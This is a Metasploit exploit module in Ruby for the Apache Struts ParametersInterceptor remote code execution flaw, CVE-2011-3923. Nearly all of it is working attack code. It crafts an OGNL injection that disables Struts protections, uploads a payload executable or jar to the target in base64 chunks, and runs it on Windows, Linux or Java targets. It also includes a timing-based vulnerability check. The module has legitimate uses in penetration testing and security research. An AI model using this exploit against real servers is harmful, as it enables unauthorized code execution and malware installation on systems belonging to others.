# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts ParametersInterceptor Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution vulnerability in Apache Struts
        versions < 2.3.1.2. This issue is caused because the ParametersInterceptor allows
        properties which allows remote attackers to execute arbitrary Java code via a
        crafted parameter.
      },
      &#039;Author&#039;         =>
        [
          &#039;Meder Kydyraliev&#039;, # Vulnerability Discovery and PoC
          &#039;Richard Hicks <scriptmonkey.blog[at]gmail.com>&#039;, # Metasploit Module
          &#039;mihi&#039; #ARCH_JAVA support
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2011-3923&#039;],
          [ &#039;OSVDB&#039;, &#039;78501&#039;],
          [ &#039;URL&#039;, &#039;http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html&#039;],
          [ &#039;URL&#039;, &#039;https://cwiki.apache.org/confluence/display/WW/S2-009&#039;]
        ],
      &#039;Platform&#039;      => [ &#039;win&#039;, &#039;linux&#039;, &#039;java&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;windows&#039;
            }
          ],
          [&#039;Linux Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;Java Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;java&#039;
            },
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 01 2011&#039;,
      &#039;DefaultTarget&#039; => 2))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;PARAMETER&#039;,[ true, &#039;The parameter to perform injection against.&#039;,"username"]),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action with the location to perform the injection&#039;, "/blank-struts2/login.action?INJECT"]),
          OptInt.new(&#039;CHECK_SLEEPTIME&#039;, [ true, &#039;The time, in seconds, to ask the server to sleep while check&#039;, 5])
    ], self.class)
  end

  def execute_command(cmd, opts = {})
    inject = "PARAMETERTOKEN=(#context[\"xwork.MethodAccessor.denyMethodExecution\"]=+new+java.lang.Boolean(false),#_memberAccess[\"allowStaticMethodAccess\"]"
    inject << "=+new+java.lang.Boolean(true),CMD)(&#039;meh&#039;)&z[(PARAMETERTOKEN)(meh)]=true"
    inject.gsub!(/PARAMETERTOKEN/,Rex::Text::uri_encode(datastore[&#039;PARAMETER&#039;]))
    inject.gsub!(/CMD/,Rex::Text::uri_encode(cmd))
    uri = String.new(datastore[&#039;TARGETURI&#039;])
    uri = normalize_uri(uri)
    uri.gsub!(/INJECT/,inject) # append the injection string
    resp = send_request_cgi({
      &#039;uri&#039;     => uri,
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
    })
    return resp #Used for check function.
  end

  def exploit
    #Set up generic values.
    @payload_exe = rand_text_alphanumeric(4+rand(4))
    pl_exe = generate_payload_exe
    append = &#039;false&#039;
    #Now arch specific...
    case target[&#039;Platform&#039;]
    when &#039;linux&#039;
      @payload_exe = "/tmp/#{@payload_exe}"
      chmod_cmd = "@java.lang.Runtime@getRuntime().exec(\"/bin/sh_-c_chmod +x #{@payload_exe}\".split(\"_\"))"
      exec_cmd = "@java.lang.Runtime@getRuntime().exec(\"/bin/sh_-c_#{@payload_exe}\".split(\"_\"))"
    when &#039;java&#039;
      @payload_exe << ".jar"
      pl_exe = payload.encoded_jar.pack
      exec_cmd = ""
      exec_cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdkChecked&#039;),"
      exec_cmd << "#q.setAccessible(true),#q.set(null,true),"
      exec_cmd << "#q=@java.lang.Class@forName(&#039;ognl.OgnlRuntime&#039;).getDeclaredField(&#039;_jdk15&#039;),"
      exec_cmd << "#q.setAccessible(true),#q.set(null,false),"
      exec_cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(&#039;#{@payload_exe}&#039;).toURI().toURL()}),"
      exec_cmd << "#c=#cl.loadClass(&#039;metasploit.Payload&#039;),"
      exec_cmd << "#c.getMethod(&#039;main&#039;,new java.lang.Class[]{@java.lang.Class@forName(&#039;[Ljava.lang.String;&#039;)}).invoke("
      exec_cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"
    when &#039;windows&#039;
      @payload_exe = "./#{@payload_exe}.exe"
      exec_cmd = "@java.lang.Runtime@getRuntime().exec(&#039;#{@payload_exe}&#039;)"
    else
      fail_with(Exploit::Failure::NoTarget, &#039;Unsupported target platform!&#039;)
    end

    #Now with all the arch specific stuff set, perform the upload.
    #109 = length of command string plus the max length of append.
    sub_from_chunk = 109 + @payload_exe.length + datastore[&#039;TARGETURI&#039;].length + datastore[&#039;PARAMETER&#039;].length
    chunk_length = 2048 - sub_from_chunk
    chunk_length = ((chunk_length/4).floor)*3
    while pl_exe.length > chunk_length
      java_upload_part(pl_exe[0,chunk_length],@payload_exe,append)
      pl_exe = pl_exe[chunk_length,pl_exe.length - chunk_length]
      append = true
    end
    java_upload_part(pl_exe,@payload_exe,append)
    execute_command(chmod_cmd) if target[&#039;Platform&#039;] == &#039;linux&#039;
    execute_command(exec_cmd)
    register_files_for_cleanup(@payload_exe)
  end

  def java_upload_part(part, filename, append = &#039;false&#039;)
    cmd = ""
    cmd << "#f=new java.io.FileOutputStream(&#039;#{filename}&#039;,#{append}),"
    cmd << "#f.write(new sun.misc.BASE64Decoder().decodeBuffer(&#039;#{Rex::Text.encode_base64(part)}&#039;)),"
    cmd << "#f.close()"
    execute_command(cmd)
  end

  def check
    sleep_time = datastore[&#039;CHECK_SLEEPTIME&#039;]
    check_cmd = "@java.lang.Thread@sleep(#{sleep_time * 1000})"
    t1 = Time.now
    print_status("Asking remote server to sleep for #{sleep_time} seconds")
    response = execute_command(check_cmd)
    t2 = Time.now
    delta = t2 - t1


    if response.nil?
      return Exploit::CheckCode::Safe
    elsif delta < sleep_time
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Appears
    end
  end

end

